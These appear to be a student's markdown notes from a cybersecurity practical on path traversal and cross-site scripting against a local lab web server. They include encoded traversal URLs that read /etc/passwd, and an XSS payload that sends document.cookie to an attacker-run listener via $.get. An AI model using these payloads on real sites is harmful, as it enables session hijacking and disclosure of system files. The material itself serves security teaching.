# What are we doing this week?

## Web server
- This practical is based off a simple web server
- In this, we will access the local file system by exploiting the way the server handles URLs in relation to the file system

## Path traversal attack
- After running the server, you can browse to it via http://127.0.0.1:12345
- After this, you can browse to local file system via using this url
- Example:
    - http://127.0.0.1:12345/..%2f goes back one step in the file structure
    - http://127.0.0.1:12345/..%2f/..%2f goes back two steps from this folder (Cybersecurity)
    - http://127.0.0.1:12345/..%2f/..%2f/..%2f goes to the github root folder
    - and so on
- This can be massively exploited:
    - Access passwords on linux - http://127.0.0.1:12345/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f/etc/passwd
- Many simply webservers are vulnerable to this attack format
- This can be avoided via checking regex expressions in the url passed to the browser

## XSS cross-site scripting attack
- This is where you can inject HTML or JS code into an input in a website to cause havoc
- Example:
    - If a website displays messages sent by users, if a user sends <script>alert('this is annoying');</script> then when the other users refresh their page this JS is executed to the user    
    - This can cause issues
    - loops can be injected, infinite loops, to make the website unusable for a user
- Injecting into prompts where it calls the code on the clients computer can let you retrieve information by hosting your own server
- Retrieve cookie from client computer (code injection):
    - this is done by injecting <script></script> tags
    - Host a hacking server on your machine -> hacking.py
    - Set up a server and then set up a method to catch requests which can catch user information
        - do_GET() function
    - Inject at client side code that makes requests to your server
        - Do this via jQuery - $.get()
    - You can then access the cookies that are stored in the client browser - document.cookie
    - E.g. $.get('http://127.0.0.1:1337/malicious?data='+ document.cookie)
    - This sends the cookie to the hacking server
- Retrieve cookie from client computer (img injection)
    - TBC